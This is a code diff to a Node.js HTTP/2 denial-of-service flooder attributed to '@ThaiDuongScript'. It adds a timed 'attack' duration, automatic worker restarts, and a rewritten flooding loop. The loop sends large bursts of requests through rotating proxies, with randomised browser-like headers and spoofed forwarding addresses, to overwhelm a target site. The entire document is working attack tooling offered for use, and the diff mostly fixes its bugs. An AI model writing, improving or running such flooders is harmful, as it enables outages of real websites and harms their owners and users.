@@ -1,4 +1,4 @@
-// Code by @ThaiDuongScript  
+// Code by @ThaiDuongScript with timeout fix
 
 const net = require("net");
 const http2 = require("http2");
@@ -13,10 +13,6 @@ const chalk = require('chalk');
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {});
-
-
-
-
 
 const headers = {};
 function getRandomInt(min, max) {
@@ -321,15 +317,179 @@ var control = control_header[Math.floor(Math.floor(Math.random() * control_heade
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
 
+// Set timeout to end the process after the specified time
+let attackRunning = true;
+if (args.time) {
+  console.log(chalk.yellow.bold(`[INFO] Attack will run for ${args.time} seconds`));
+  setTimeout(() => {
+    console.log(chalk.green.bold(`[INFO] Attack finished after ${args.time} seconds`));
+    attackRunning = false;
+    setTimeout(() => {
+      process.exit(0);
+    }, 1000);
+  }, args.time * 1000);
+}
+
 if (cluster.isMaster) {
-
-
-
+  console.log(chalk.green.bold(`[INFO] Starting attack on ${args.target} for ${args.time} seconds`));
+  console.log(chalk.yellow.bold(`[INFO] Using ${args.threads} threads and ${args.Rate} requests per second`));
 
   for (let counter = 1; counter <= args.threads; counter++) {
     cluster.fork();
   }
- } else { setInterval(runFlooder) }
+  
+  cluster.on('exit', (worker) => {
+    if (attackRunning) {
+      console.log(chalk.red.bold(`[INFO] Worker ${worker.id} died, restarting...`));
+      cluster.fork();
+    }
+  });
+  
+} else { 
+  // Worker process
+  function runFlooder() {
+    if (!attackRunning) return;
+    
+    const proxyAddr = randomElement(proxies);
+    const parsedProxy = proxyAddr.split(":");
+
+    const proxyOptions = {
+      host: parsedProxy[0],
+      port: ~~parsedProxy[1],
+      address: parsedTarget.host + ":443",
+      timeout: 300,
+    };
+
+    Socker.HTTP(proxyOptions, (connection, error) => {
+      if (error) return;
+      if (!attackRunning) {
+        connection.destroy();
+        return;
+      }
+
+      connection.setKeepAlive(true, 200000);
+
+      const tlsOptions = {
+         secure: true,
+        ALPNProtocols: ['h2'],
+        sigals: siga,
+        requestCert: false,
+        socket: connection,
+        ciphers: cipper,
+        ecdhCurve: "X25519",
+        host: parsedTarget.host,
+        rejectUnauthorized: false,
+        servername: parsedTarget.host,
+        secureProtocol: "TLS_method",
+      };
+
+      const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
+
+      tlsConn.setKeepAlive(true, 60000);
+
+      const client = http2.connect(parsedTarget.href, {
+        protocol: "https:",
+        settings: {
+          headerTableSize: 65536,
+          maxConcurrentStreams: 10000,
+          initialWindowSize: 6291456,
+          maxHeaderListSize: 65536,
+          enablePush: false
+        },
+        maxSessionMemory: 64000,
+        maxDeflateDynamicTableSize: 4294967295,
+        createConnection: () => tlsConn,
+        socket: connection,
+      });
+
+      client.settings({
+        headerTableSize: 65536,
+        maxConcurrentStreams: 10000,
+        initialWindowSize: 6291456,
+        maxHeaderListSize: 65536,
+        enablePush: false
+      });
+
+      client.on("connect", () => {
+        const IntervalAttack = setInterval(() => {
+          if (!attackRunning) {
+            clearInterval(IntervalAttack);
+            client.close();
+            connection.destroy();
+            return;
+          }
+          
+          const dynHeaders = {
+            ...headers,
+            ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
+          };
+          
+          // Fix for headers
+          dynHeaders[":method"] = "GET";
+          dynHeaders[":authority"] = parsedTarget.host;
+          dynHeaders[":path"] = parsedTarget.path + "?robots.txt=" + randstr(15) + ":" + randstr(9);
+          dynHeaders[":scheme"] = "https";
+          dynHeaders["referer"] = Ref;
+          dynHeaders["origin"] = "https://www.google.com/" + "page=" + randstr(12);
+          dynHeaders["sec-ch-ua"] = secChUa;
+          dynHeaders["sec-ch-ua-platform"] = ch_ua_ver;
+          dynHeaders["sec-ch-ua-mobile"] = "?0";
+          dynHeaders["accept-encoding"] = encoding;
+          dynHeaders["accept-language"] = lang;
+          dynHeaders["user-agent"] = u;
+          dynHeaders["upgrade-insecure-requests"] = "1";
+          dynHeaders["accept"] = accept;
+          dynHeaders["sec-fetch-mode"] = "navigate";
+          dynHeaders["sec-fetch-dest"] = "document";
+          dynHeaders["sec-fetch-site"] = "same-origin";
+          dynHeaders["sec-fetch-user"] = "?1";
+          dynHeaders["x-requested-with"] = "XMLHttpRequest";
+          
+          for (let i = 0; i < args.Rate; i++) {
+            if (!attackRunning) break;
+            
+            const request = client.request(dynHeaders);
+
+            request.on("response", (headers) => {
+              if (headers[':status'] === 403) {
+                client.close();
+                client.destroy();
+                connection.destroy();
+                delete u;
+              }
+              console.log(`(${'ThaiDuong'.bold.cyan}).  |. Proxy: ${proxyAddr}.  |. Target:${args.target}. |. Status: ${headers[':status']}. |. useragent:${u}. |. se-ch-ua-platform:${ch_ua_ver}. |. referer:${Ref}. |`);
+              request.close();
+              request.destroy();
+            });
+
+            request.end();
+          }
+        }, 500);
+        
+        // Make sure to clear interval if client disconnects
+        client.on("close", () => {
+          clearInterval(IntervalAttack);
+          client.destroy();
+          connection.destroy();
+          return;
+        });
+      });
+
+      client.on("error", (error) => {
+        if (error.code === "ERR_HTTP2_GOAWAY_SESSION" || error.code === "ECONNRESET" || error.code == "ERR_HTTP2_ERROR") {
+          client.close();
+        }
+      });
+    });
+  }
+  
+  // Start the attack
+  setInterval(() => {
+    if (attackRunning) {
+      runFlooder();
+    }
+  }, 1000);
+}
 
 class NetSocket {
   constructor() { }
@@ -374,37 +534,9 @@ class NetSocket {
   }
 }
 
-const Socker = new NetSocket();
-headers["x-forwarded-for"] = "192.168.1.1";
-headers[":method"] = "GET";
-headers[":authority"] = parsedTarget.host;
-headers[":path"] = parsedTarget.path + "?robots.txt=" + randstr(15) + ":" + randstr(9);
-headers[":scheme"] = "https";
-headers["referer"] = Ref;
-headers["origin"] = "https://www.google.com/" + "page=" + randstr(12) ;
-headers["sec-ch-ua"] = secChUa;
-headers["sec-ch-ua-platform"] = ch_ua_ver;
-headers["sec-ch-ua-mobile"] = "?0";
-headers["accept-encoding"] = encoding;
-headers["accept-language"] = lang;
-headers["user-agent"] = u;
-headers["upgrade-insecure-requests"] = "1";
-headers["accept"] = accept;
-headers["sec-fetch-mode"] = "navigate";
-headers["sec-fetch-dest"] = "document";
-headers["sec-fetch-site"] = "same-origin";
-headers["sec-fetch-user"] = "?1";
-headers["x-requested-with"] = "XMLHttpRequest";
-
-
-
 function buildRequest() {
-    
-
     const fwfw = ['Google Chrome', 'Brave'];
     const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
-
-
 
     const isBrave = wfwf === 'Brave';
 
@@ -412,162 +544,37 @@ function buildRequest() {
         ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
         : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
 
-
     const langValue = isBrave
         ? 'en-US,en;q=0.6'
         : 'en-US,en;q=0.7';
-
         
-const a = getRandomInt(99,113);
-
-
-const ua = `Mozilla/5.0 (Macintosh; Intel Mac OS X 1${randstra(1)}.${randstra(1)}; rv:${a}.0) Gecko/20100101 Firefox/${a}.0`;
-
-    
-
-
+    const a = getRandomInt(99,113);
+    const ua = `Mozilla/5.0 (Macintosh; Intel Mac OS X 1${randstra(1)}.${randstra(1)}; rv:${a}.0) Gecko/20100101 Firefox/${a}.0`;
     
     let mysor = '\r\n';
     let mysor1 = '\r\n';
 
-    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
+    // Note: This function has issues with undefined variable reqmethod and url
+    // Fixed version would need proper URL parsing and method definition
+    let headers = `GET / HTTP/1.1\r\n` +
         `Accept: ${acceptHeaderValue}\r\n` +
         'Accept-Encoding: gzip, deflate, br\r\n' +
         `Accept-Language: ${langValue}\r\n` +
         'Cache-Control: max-age=0\r\n' +
         'Connection: Keep-Alive\r\n' +
-        `Host: ${url.hostname}\r\n` +
+        `Host: ${parsedTarget.hostname}\r\n` +
         'Sec-Fetch-Dest: document\r\n' +
         'Sec-Fetch-Mode: navigate\r\n' +
         'Sec-Fetch-Site: none\r\n' +
         'Sec-Fetch-User: ?1\r\n' +
         'Upgrade-Insecure-Requests: 1\r\n' +
-        `User-Agent: ua\r\n` + mysor1;
-
-
-    
+        `User-Agent: ${ua}\r\n` + mysor1;
 
     const mmm = Buffer.from(`${headers}`, 'binary');
     return mmm;
 }
 
-const h1payl = Buffer.concat(new Array(1).fill(buildRequest()))
+const h1payl = Buffer.concat(new Array(1).fill(buildRequest()));
 
-
-function runFlooder() {
-  const proxyAddr = randomElement(proxies);
-  const parsedProxy = proxyAddr.split(":");
-
-  const proxyOptions = {
-    host: parsedProxy[0],
-    port: ~~parsedProxy[1],
-    address: parsedTarget.host + ":443",
-    timeout: 300,
-  };
-
-  Socker.HTTP(proxyOptions, (connection, error) => {
-    if (error) return;
-
-    connection.setKeepAlive(true, 200000);
-
-    const tlsOptions = {
-       secure: true,
-      ALPNProtocols: ['h2'],
-      sigals: siga,
-      requestCert: false,
-      socket: connection,
-      ciphers: cipper,
-      ecdhCurve: "X25519",
-      host: parsedTarget.host,
-      rejectUnauthorized: false,
-      servername: parsedTarget.host,
-      secureProtocol: "TLS_method",
-    };
-function main() {
-                        tlsSocket.write(h1payl, (err) => {
-                            if (!err) {
-                                setTimeout(() => {
-                                    main()
-                                }, isFull ? 1 : 1000 / args.Rate)
-                            } else {
-                                tlsSocket.end(() => tlsSocket.destroy())
-                            }
-                        })
-                    
-                    main()
-
-                    tlsSocket.on('error', () => {
-                        tlsSocket.end(() => tlsSocket.destroy())
-                    })
-                    return
-                }
-    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
-
-    tlsConn.setKeepAlive(true, 60000);
-
-    const client = http2.connect(parsedTarget.href, {
-      protocol: "https:",
-      settings: {
-        headerTableSize: 65536,
-        maxConcurrentStreams: 10000,
-        initialWindowSize: 6291456,
-        maxHeaderListSize: 65536,
-        enablePush: false
-      },
-      maxSessionMemory: 64000,
-      maxDeflateDynamicTableSize: 4294967295,
-      createConnection: () => tlsConn,
-      socket: connection,
-    });
-
-    client.settings({
-      headerTableSize: 65536,
-      maxConcurrentStreams: 10000,
-      initialWindowSize: 6291456,
-      maxHeaderListSize: 65536,
-      enablePush: false
-    });
-
-    client.on("connect", () => {
-      const IntervalAttack = setInterval(() => {
-        const dynHeaders = {
-          ...headers,
-          ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
-        };
-        for (let i = 0; i < args.Rate; i++) {
-          const request = client.request(dynHeaders);
-
-          request.on("response", (headers) => {
- if (headers[':status'] === 403) {
-          client.close();
-          client.destroy();
-          tlsOptions.destroy();
-          delete u;
-          
-   }
-            console.log(`(${'ThaiDuong'.bold.cyan}).  |. Proxy: ${proxyAddr}.  |. Target:${args.target}. |. Status: ${headers[':status']}. |. useragent:${u}. |. se-ch-ua-platform:${ch_ua_ver}. |. referer:${Ref}. |`);
-            request.close();
-            request.destroy();
-          });
-
-          request.end();
-        }
-      }, 500);
-    });
-
-    client.on("close", () => {
-      client.destroy();
-      connection.destroy();
-      return;
-    });
-  }, function (error, response, body) {
-    connection.destroy();
-    console.log("Error:", error);
-  });
-}
-client.on("error", (error) => {
-if (error.code === "ERR_HTTP2_GOAWAY_SESSION" || error.code === "ECONNRESET" || error.code == "ERR_HTTP2_ERROR") {
-                    client.close(); //(socket close)
-                }
-            })
-
+const Socker = new NetSocket();
+headers["x-forwarded-for"] = spoofed;
